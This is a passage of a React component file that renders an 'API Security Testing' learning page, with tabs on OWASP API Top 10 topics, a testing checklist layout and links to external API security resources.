                        <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                          <Typography variant="body2">• {tip}</Typography>
                        </ListItem>
                      ))}
                    </List>
                  </Alert>
                </Grid>
              )}
            </Grid>
          </AccordionDetails>
        </Accordion>
      ))}
    </>
  );
}

export default function ApiSecurityPage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const [tabValue, setTabValue] = useState(0);

  return (
    <Container maxWidth="lg" sx={{ py: 4 }}>
      {/* Back Button */}
      <IconButton onClick={() => navigate("/learn")} sx={{ mb: 2 }}>
        <ArrowBackIcon />
      </IconButton>

      {/* Header */}
      <Box sx={{ mb: 5 }}>
        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <Box
            sx={{
              width: 64,
              height: 64,
              borderRadius: 3,
              background: `linear-gradient(135deg, #3b82f6, #8b5cf6)`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxShadow: `0 8px 32px ${alpha("#3b82f6", 0.3)}`,
            }}
          >
            <ApiIcon sx={{ fontSize: 32, color: "white" }} />
          </Box>
          <Box>
            <Typography
              variant="h3"
              sx={{
                fontWeight: 800,
                background: `linear-gradient(135deg, #3b82f6, #8b5cf6)`,
                backgroundClip: "text",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
              }}
            >
              API Security Testing
            </Typography>
            <Typography variant="h6" color="text.secondary">
              Comprehensive guide to REST, GraphQL, and API vulnerability testing
            </Typography>
          </Box>
        </Box>
      </Box>

      {/* Stats */}
      <Grid container spacing={2} sx={{ mb: 4 }}>
        {[
          { value: "8", label: "Sections", color: "#3b82f6" },
          { value: "25+", label: "Attack Types", color: "#ef4444" },
          { value: "50+", label: "Techniques", color: "#f59e0b" },
          { value: "OWASP", label: "API Top 10", color: "#10b981" },
        ].map((stat) => (
          <Grid item xs={6} md={3} key={stat.label}>
            <Paper
              sx={{
                p: 2.5,
                textAlign: "center",
                borderRadius: 3,
                border: `1px solid ${alpha(stat.color, 0.2)}`,
                background: `linear-gradient(135deg, ${alpha(stat.color, 0.05)}, transparent)`,
              }}
            >
              <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                {stat.value}
              </Typography>
              <Typography variant="body2" color="text.secondary">
                {stat.label}
              </Typography>
            </Paper>
          </Grid>
        ))}
      </Grid>

      {/* OWASP API Top 10 Reference */}
      <Alert
        severity="info"
        sx={{ mb: 4, borderRadius: 3 }}
      >
        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
          📚 Based on OWASP API Security Top 10 (2023)
        </Typography>
        <Typography variant="body2">
          This guide covers: API1:BOLA, API2:Broken Authentication, API3:BOPLA, API4:Unrestricted Resource Consumption,
          API5:BFLA, API6:SSRF, API7:Security Misconfiguration, API8:Lack of Protection, API9:Improper Inventory Management, API10:Unsafe Consumption
        </Typography>
      </Alert>

      {/* Tabs */}
      <Paper sx={{ borderRadius: 3, overflow: "hidden" }}>
        <Tabs
          value={tabValue}
          onChange={(_, v) => setTabValue(v)}
          variant="scrollable"
          scrollButtons="auto"
          sx={{
            bgcolor: alpha(theme.palette.background.paper, 0.8),
            borderBottom: `1px solid ${theme.palette.divider}`,
            "& .MuiTab-root": {
              minHeight: 64,
              textTransform: "none",
              fontWeight: 600,
            },
          }}
        >
          {tabSections.map((section, i) => (
            <Tab
              key={section.label}
              label={
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <Box sx={{ color: tabValue === i ? section.color : "text.secondary" }}>
                    {section.icon}
                  </Box>
                  {section.label}
                </Box>
              }
            />
          ))}
        </Tabs>

        <Box sx={{ p: 3 }}>
          <TabPanel value={tabValue} index={0}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              🔍 API Discovery & Enumeration
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Before testing, you need to find and map all API endpoints, understand the technology stack,
              and gather documentation.
            </Typography>
            <TopicAccordion topics={discoveryTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={1}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              🔐 Authentication Testing
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Test API authentication mechanisms including API keys, JWTs, OAuth, and session management
              for common vulnerabilities.
            </Typography>
            <TopicAccordion topics={authTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={2}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              🛡️ Authorization Testing (BOLA/BFLA)
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Broken Object Level Authorization (BOLA) and Broken Function Level Authorization (BFLA)
              are the #1 and #5 API security risks. Test thoroughly!
            </Typography>
            <TopicAccordion topics={authzTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={3}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              💉 Injection Attacks
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Test API parameters, headers, and request bodies for SQL injection, NoSQL injection,
              command injection, and SSRF.
            </Typography>
            <TopicAccordion topics={injectionTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={4}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              👁️ Data Exposure & Mass Assignment
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              APIs often return more data than needed or allow modification of restricted fields.
              Look for sensitive data leaks and mass assignment vulnerabilities.
            </Typography>
            <TopicAccordion topics={dataTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={5}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              ⚡ Rate Limiting & Resource Exhaustion
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Test API rate limiting implementation and look for bypass techniques.
              Also test for denial of service through resource exhaustion.
            </Typography>
            <TopicAccordion topics={rateLimitTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={6}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              💜 GraphQL Security
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              GraphQL has unique attack vectors including introspection, query complexity attacks,
              batching abuse, and authorization bypass through nested queries.
            </Typography>
            <TopicAccordion topics={graphqlTopics} />
          </TabPanel>

          <TabPanel value={tabValue} index={7}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1 }}>
              ✅ API Security Testing Checklist
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Use this checklist to ensure comprehensive coverage during your API security assessments.
            </Typography>
            <Grid container spacing={3}>
              {checklistItems.map((category) => (
                <Grid item xs={12} sm={6} md={4} key={category.category}>
                  <Card
                    sx={{
                      height: "100%",
                      borderTop: `4px solid ${category.color}`,
                      borderRadius: 2,
                    }}
                  >
                    <CardContent>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: category.color }}>
                        {category.category}
                      </Typography>
                      {category.items.map((item) => (
                        <Box key={item} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                          <Box
                            sx={{
                              width: 18,
                              height: 18,
                              border: `2px solid ${alpha(category.color, 0.3)}`,
                              borderRadius: 0.5,
                              flexShrink: 0,
                            }}
                          />
                          <Typography variant="body2">{item}</Typography>
                        </Box>
                      ))}
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </TabPanel>
        </Box>
      </Paper>

      {/* Resources */}
      <Paper sx={{ mt: 4, p: 4, borderRadius: 3, bgcolor: alpha(theme.palette.info.main, 0.02) }}>
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3 }}>
          📚 Essential API Security Resources
        </Typography>
        <Grid container spacing={2}>
          {[
            { name: "OWASP API Security Top 10", url: "https://owasp.org/API-Security/", desc: "Official OWASP API security risks" },
            { name: "PortSwigger API Testing", url: "https://portswigger.net/web-security/api-testing", desc: "Free labs for API security testing" },
            { name: "API Security Checklist", url: "https://github.com/shieldfy/API-Security-Checklist", desc: "Comprehensive API security checklist" },
            { name: "GraphQL Security", url: "https://graphql.org/learn/security/", desc: "Official GraphQL security guidance" },
            { name: "JWT.io", url: "https://jwt.io/", desc: "JWT debugger and library reference" },
            { name: "Kiterunner", url: "https://github.com/assetnote/kiterunner", desc: "API endpoint discovery tool" },
          ].map((resource) => (
            <Grid item xs={12} sm={6} key={resource.name}>
              <Paper
                sx={{
                  p: 2,
                  borderRadius: 2,
                  border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                  cursor: "pointer",
                  transition: "all 0.2s",
                  "&:hover": {
                    borderColor: "primary.main",
                    transform: "translateY(-2px)",
                  },
                }}
                onClick={() => window.open(resource.url, "_blank")}
              >
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "primary.main" }}>
                  {resource.name} ↗
                </Typography>
                <Typography variant="body2" color="text.secondary">
                  {resource.desc}
                </Typography>
              </Paper>
            </Grid>
          ))}
        </Grid>
      </Paper>
    </Container>
  );
}
